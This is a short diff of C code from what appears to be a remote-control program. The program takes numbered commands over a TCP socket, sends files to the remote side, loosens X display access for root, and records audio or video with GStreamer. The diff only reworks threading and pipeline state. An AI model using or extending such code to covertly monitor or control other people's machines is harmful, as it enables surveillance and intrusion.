@@ -162,8 +162,6 @@ void dispatch_modules(char *argv[])
     const char *fedora_xhost = "xhost +si:localuser:root";
 
 
-
-
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if(sock == INVALID_SOCKET)
     {
@@ -375,8 +373,6 @@ void dispatch_modules(char *argv[])
         if(flag == 15)
         {
             printf("\t\tSENDING BINARIE TO DOWNLOAD ....\n");
-            send_dowloaded_binarie();
-            /*
             if(pthread_create(&thread_downloader, NULL, (void*(*)(void*))send_dowloaded_binarie, NULL) == -1)
             {
                 error("pthread_create() send_dowloaded_binarie", "dispatch_modules()");
@@ -388,7 +384,6 @@ void dispatch_modules(char *argv[])
                 perror("pthread_join");
                 return;
             }
-            */
         }
 
         if(flag == 10)
@@ -1020,7 +1015,7 @@ void *send_dowloaded_file(void)
     pthread_exit(NULL);
 }
 
-void send_dowloaded_binarie(void)
+void *send_dowloaded_binarie(void)
 {
     gchar *file_path = NULL;
     size_t len_file_path = 0;
@@ -1794,7 +1789,12 @@ void *execute_record_cmd(void)
 
     g_main_loop_unref (main_loop);
     gst_object_unref(bus);
-    gst_element_set_state (pipeline, GST_STATE_NULL);
+
+    if(on_video == 1)
+        gst_element_set_state (pipeline, GST_STATE_NULL);
+    else
+        gst_element_set_state (pipeline, GST_STATE_PLAYING);
+
     gst_object_unref(pipeline);
 
     free(buffer);
